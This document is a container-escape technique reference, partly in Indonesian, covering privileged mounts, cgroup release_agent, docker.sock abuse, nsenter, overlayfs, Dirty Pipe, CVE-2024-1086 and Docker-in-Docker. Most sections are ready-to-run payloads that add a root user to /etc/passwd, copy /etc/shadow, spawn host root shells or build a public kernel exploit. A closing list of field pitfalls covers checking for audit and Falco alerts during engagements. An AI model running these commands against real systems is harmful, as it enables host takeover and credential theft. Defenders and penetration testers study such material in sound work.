# container-escape — cloud

# Container Escape — Technique Reference

## Summary Table

| # | Technique | Prerequisites | Target | Effect |
|---|--------|-----------|--------|------|
| 1 | Privileged + host mount | `--privileged` | Host FS | rw host mount via `/dev/sdX` |
| 2 | cgroup `release_agent` | `--privileged` OR `CAP_SYS_ADMIN` + cgroup v1 | Kernel | Exec in host root |
| 3 | `hostPath: /var/run/docker.sock` | Socket ter-mount | Docker daemon host | `docker run -v /:/host` |
| 4 | `hostPID: true` + `nsenter` | `hostPID: true` + `CAP_SYS_ADMIN` (or `--privileged`) | Host PID ns | Shell on host |
| 5 | `CAP_SYS_ADMIN` + overlayfs | Single cap + mount allowed | Overlay upper | Write to host path |
| 6 | Dirty Pipe (CVE-2022-0847) | Kernel 5.8–5.16.11 / 5.15.x<5.15.25 / 5.10.x<5.10.102 | RO file on host (via mount) | Overwrite `/etc/passwd`, SUID |
| 7 | nf_tables (CVE-2024-1086) | Kernel 5.14–6.6, unprivileged userns OR `CAP_NET_ADMIN` | Kernel LPE | root on host |
| 8 | DinD escape | Access to DinD daemon (`tcp://dind:2375`) | Sibling container / dind host | Mount dind rootfs |

---

## 1. Privileged Container + Host Mount

**What is sent:** `docker run --privileged -v /:/host ...` (or Pod with `securityContext.privileged: true`).

**Check prerequisites:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_rawio'
ls /dev/sd* /dev/nvme* 2>/dev/null
cat /proc/self/status | grep CapEff   # harus 000001ffffffffff (full)
mount | grep -E ' / | /host'
```

**Eksploit host block device:**
```bash
# Temukan rootfs host
lsblk -f
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
# Bypass chroot kalau perlu
chroot /mnt/host /bin/bash
# Atau langsung modifikasi
echo 'attacker:$6$...:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
# Atau baca kredensial
cat /mnt/host/etc/shadow
```

**If `/dev` is not exposed but full privilege:**
```bash
mknod /tmp/sda b 8 0            # major:minor dari /proc/partitions host (baca via /proc)
mount /tmp/sda /mnt/host
```

**Why it works:** `--privileged` gives all caps + devices + no DropBoundingSet. `CAP_SYS_ADMIN` is required for `mount()`.

**Why it fails:** AppArmor profile `docker-default` on Ubuntu 22.04+ still allows mount; SELinux enforcing (`container_t`) blocks block device mount → `Permission denied` even though the cap exists.

---

## 2. cgroup v1 `release_agent` Escape

**Prerequisites:** cgroup **v1** (kernel < 5.19 default, or `systemd.unified_cgroup_hierarchy=0`), privileged container OR has `CAP_SYS_ADMIN` + cgroup fs writable.

**Cek:**
```bash
mount | grep cgroup
cat /proc/self/cgroup
ls /sys/fs/cgroup/*/release_agent 2>/dev/null   # harus ada (v1)
```

**Payload:**
```bash
# 1. Mount cgroup v1 (kalau belum)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Path host dari container (via /proc/mounts atau /etc/mtab)
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. Script yang dieksekusi di host
cat > /cmd <<'EOF'
#!/bin/sh
cp /etc/shadow /tmp/shadow.leak
chmod 644 /tmp/shadow.leak
EOF
chmod +x /cmd

# 5. Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Why it works:** `release_agent` is executed by the kernel in the **host root namespace** when the cgroup is empty. The path in `release_agent` is resolved from the host FS, so container `/cmd` = `$host_path/cmd`.

**Why it fails:** cgroup v2 (default Ubuntu 21.10+, k8s 1.25+ with cgroup v2) has no `release_agent` → `File not found`. Modern container runtime (runc ≥1.1.0) blocks `release_agent` write if not privileged.

---

## 3. `hostPath: /var/run/docker.sock`

**Manifes k8s rentan:**
```yaml
volumes:
  - name: sock
    hostPath: { path: /var/run/docker.sock, type: Socket }
containers:
  - volumeMounts: [{ name: sock, mountPath: /var/run/docker.sock }]
```

**Escape:**
```bash
curl --unix-socket /var/run/docker.sock http://x/version
# Jalankan container baru dengan host root ter-mount
docker -H unix:///var/run/docker.sock run -it --rm \
  -v /:/host --privileged alpine chroot /host /bin/bash
# Alternatif: exec ke container yang sudah jalan
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock exec -it <id> sh
```

**Why it works:** socket = full Docker API. `POST /containers/create` with `Binds: ["/:/host"]` + `Privileged: true`.

**Why it fails:** Docker daemon with `--userns-remap` + rootless → UID mapping, mount `/` remains in user ns. Read-only socket mount → `connect: permission denied` during create.

---

## 4. `hostPID: true` + `nsenter`

**Prerequisites:** `hostPID: true` + `CAP_SYS_ADMIN` (or `--privileged`). Non-privileged Pod with `hostPID` alone is NOT enough — `nsenter` requires `CAP_SYS_ADMIN`.

**Cek:**
```bash
ps aux | head          # PID 1 = host systemd => hostPID aktif
ls /proc/1/ns/
```

**Payload:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Atau tanpa CAP_SYS_ADMIN? tidak bisa. Cek:
nsenter -t 1 -m -p id
```

**Why it works:** `/proc/1/ns/*` points to the host namespace; `setns()` requires `CAP_SYS_ADMIN` in the target (host) ns — provided by privileged/`SYS_ADMIN`.

**Why it fails:** PodSecurity `baseline`/`restricted` rejects `hostPID: true` in 1.25+. If `CAP_SYS_ADMIN` is dropped, `nsenter: reassociate to namespace 'ns/mnt': Operation not permitted`.

---

## 5. `CAP_SYS_ADMIN` + OverlayFS

**Scenario:** container only has `CAP_SYS_ADMIN` (not privileged), container rootfs = overlayfs with `upperdir` on host.

**Cek:**
```bash
cat /proc/mounts | grep overlay
# cari: upperdir=/var/lib/docker/overlay2/<id>/diff,workdir=...
capsh --print | grep cap_sys_admin
```

**Payload (upperdir writable from host path):**
```bash
# Buat mount overlay baru dengan upperdir menunjuk host path
mkdir -p /tmp/lower /tmp/upper /tmp/work /tmp/merged
mount -t overlay overlay \
  -o lowerdir=/tmp/lower,upperdir=/tmp/upper,workdir=/tmp/work \
  /tmp/merged
# Kalau upperdir host yang writable, tulis file langsung ke situ:
# /var/lib/docker/overlay2/<id>/diff/root/.ssh/authorized_keys
```

**Variant: shiftfs / idmapped mount** (Ubuntu 22.04+, kernel 5.12+) — with `CAP_SYS_ADMIN`, mount `-o idmap=...` can bypass UID mapping.

**Why it works:** `CAP_SYS_ADMIN` allows arbitrary `mount()`. If the host path is resolved through the namespace, writing to upperdir = writing to host.

**Why it fails:** User namespace (`userns-remap`, rootless Docker, k8s user-ns 1.30+) → `mount: permission denied` because `SYS_ADMIN` in userns ≠ host userns. Docker default seccomp blocks `mount` for non-privileged.

---

## 6. CVE Kernel — Dirty Pipe (CVE-2022-0847)

**Versi rentan:** 5.8 ≤ kernel < 5.16.11, 5.15.x < 5.15.25, 5.10.x < 5.10.102. Fixed 5.16.11 / 5.15.25 / 5.10.102.

**Prerequisites:** read access to the target file (readable), the file must be in page cache (usually already is), no special cap required — works unprivileged.

**Cek:**
```bash
uname -r        # 5.15.0-25-generic Ubuntu 22.04 = rentan
id
```

**Exploit (overwrite SUID binary or `/etc/passwd` if writable via mount):**
```bash
# Compile expl.c (Blasty's dirtypipe.c atau versi minimal)
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/su   # inject payload ke SUID binary → root
# Atau modifikasi /etc/passwd jika rootfs host ter-mount readable
./dirtypipe /etc/passwd 1 'root:x:0:0:root:/root:/bin/bash'
```

**Core snippet:**
```c
// 1. splice() satu byte dari file ke pipe → setu PIPE_BUF_FLAG_CAN_MERGE
// 2. pipe_write() ke file offset tanpa O_RDONLY check → overwrite page cache
loff_t off = offset - 1;
splice(fd, &off, p[1], NULL, 1, 0);
write(p[1], data, len);
```

**Why it works:** bug in `copy_page_to_iter_pipe` / `push_pipe` does not reset `PIPE_BUF_FLAG_CAN_MERGE`. Page cache write without permission check → modify RO file on host (via mount) or SUID.

**Why it fails:** kernel patched (Ubuntu 5.15.0-27+, Debian 5.10.106+, RHEL 8.5 kernel-4.18.0-348.20+). AppArmor is not relevant. Immutable file (`chattr +i`) → still fails to write page cache.

---

## 7. CVE-2024-1086 — nf_tables UAF

**Versi rentan:** Linux 5.14 – 6.6 (fixed 6.1.76, 6.6.15, 6.7.3, 6.8). **Affects Ubuntu 22.04 (5.15), Debian 12 (6.1.0-15), RHEL 9.3.**

**Prerequisites:** `CAP_NET_ADMIN` in the netns where nftables is active, OR unprivileged user namespace (`kernel.unprivileged_userns_clone=1` + `net.ipv4.ip_unprivileged_port_start` irrelevant) — for containers, userns usually already exists.

**Cek:**
```bash
uname -r
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
capsh --print | grep net_admin
nft --version
```

**Exploit:** use `Notselwyn/CVE-2024-1086` (public, universal PoC).
```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086 && make
./exploit
# output: "root shell" via modprobe_path overwrite
```

**Mechanism:** double-free in `nft_verdict_init` → UAF → overwrite `modprobe_path` to attacker script → trigger modprobe → exec in host root context.

**Why it fails:** kernel patched, `kernel.unprivileged_userns_clone=0` + without `CAP_NET_ADMIN` → cannot create netns. Seccomp `SCMP_ACT_ERRNO` on `nft_*` syscalls is not relevant (nft uses netlink). Docker default seccomp profile blocks `unshare(CLONE_NEWUSER)` → requires container with `--security-opt seccomp=unconfined` OR userns already mapped.

---

## 8. Docker-in-Docker Escape

**Scenario:** container has access to DinD daemon (`DOCKER_HOST=tcp://dind:2375` or DinD socket). DinD container is usually privileged + has host PID.

**What is sent:**
```bash
docker -H tcp://dind:2375 version
docker -H tcp://dind:2375 ps -a
# Sibling container: mount rootfs DinD container (bukan host asli, tapi berisi /var/lib/docker)
docker -H tcp://dind:2375 run --rm -it -v /:/dind alpine chroot /dind
```

**Escape to the real host (if DinD privileged):**
```bash
# Dari shell DinD host, /proc/1 adalah systemd HOST (karena privileged DinD sering pakai hostPID=false tapi privileged)
# Di dalam DinD shell:
nsenter --target 1 --mount --all -- /bin/bash   # jika privileged
# Atau cek /dev host
ls /dev/sd*
```

**What appears:** `/var/lib/docker/` nested DinD, image manifests, sometimes `/etc/kubernetes` if DinD is in CI k8s. If DinD is `--privileged` and the parent is also privileged → chain to the real host can break through.

**Why it fails:** DinD `--userns=host` + `--privileged` = escape to DinD host (which is privileged) → to host. But DinD with **rootless** or **sysbox** runtime → no privilege to parent host; `/proc/1` is DinD init, not host.

---

## Operational Pitfalls in the Field

1. **cgroup v2 silently disables release_agent.** Ubuntu 21.10+/22.04, k8s 1.25+, RHEL 9 default to cgroup v2. Check `mount | grep cgroup2` before wasting time. `systemd.unified_cgroup_hierarchy=0` only in k8s <1.25.

2. **`--privileged` ≠ effective `CAP_SYS_ADMIN`.** Runtime `runc ≥1.1.0` + AppArmor `docker-default` on Ubuntu 22.04 still blocks `mount` on some paths. Check `aa-status` on host; `dmesg | grep -i apparmor` on host shows `DENIED`.

3. **`hostPID: true` without `CAP_SYS_ADMIN` cannot `nsenter`.** Many writeups are wrong. `nsenter(1)` needs `CAP_SYS_ADMIN` in target ns. k8s ADR: PSA `restricted` rejects `hostPID`. Check `capsh --print | grep sys_admin` before running.

4. **Dirty Pipe requires readable target file.** Overwriting host `/etc/passwd` only works if host rootfs is mounted **readable** in container (not via `-v` with `:ro` to specific file). `chattr +i` on target file → page cache write fails even though bug exists.

5. **nf_tables requires buildable netns.** Docker default seccomp blocks `unshare(CLONE_NEWUSER)` → CVE-2024-1086 only works in container with `--security-opt seccomp=unconfined` or one that actually has `CAP_NET_ADMIN`. K8s PSA `baseline` rejects `NET_ADMIN`.

6. **`/var/run/docker.sock` read-only is still dangerous for read.** `GET /containers/json` + `GET /containers/{id}/logs` leak env secrets. Ones needing create (escape) only need rw.

7. **DinD sibling ≠ real host.** `-v /:/host` to DinD daemon mounts DinD container rootfs, not physical host. Unless DinD is privileged & hostPID → only then does it break through. Always `cat /proc/1/cgroup` in exec result to verify level.

8. **UID mapping rootless/userns-remap.** `id` inside = 0 but on host = 100000. Writing host `/etc/passwd` → owner 100000, cannot login root. Check `cat /proc/self/uid_map` first; if mapping is not 0→0, privileged mount technique becomes ineffective for direct host privesc.

9. **SELinux enforcing (RHEL/Fedora/CentOS Stream 9+).** `container_t` blocks `mount`, `mknod`, access to `/dev/sd*`, write to `/etc/shadow` → `Permission denied` even with `--privileged`. Check `getenforce` on host; if `Enforcing`, `--privileged` is not enough to escape block device.

10. **Docker default seccomp blocks key syscalls.** `mount`, `pivot_root`, `setns`, `unshare`, `clone` with `CLONE_NEWUSER` → `EPERM`. Requires `--security-opt seccomp=unconfined` (or custom profile) for techniques 1, 2, 5, 7. `nsenter` (technique 4) works because `setns` is also blocked by default — so `--privileged` (whose default seccomp is unconfined) is a real prerequisite.

11. **Distro kernel patches defeat CVE without changing major version.** Ubuntu `5.15.0-25` is vulnerable to Dirty Pipe, `5.15.0-27` is not — even though `uname -r` is both 5.15.x. Always check `dpkg -l linux-image-*` or `/proc/version_signature`, not just `uname -r`.

12. **Audit/logging kills techniques before they succeed.** `auditd` rule `-w /etc/passwd -p wa`, Falco rule `Privileged Container`, k8s audit `PodSecurityViolation`. In real engagements, check first: `ls /var/log/falco* /var/log/audit/` — escape can succeed but blue team already has an alert before the first hour.

---

## [reasoning trace]


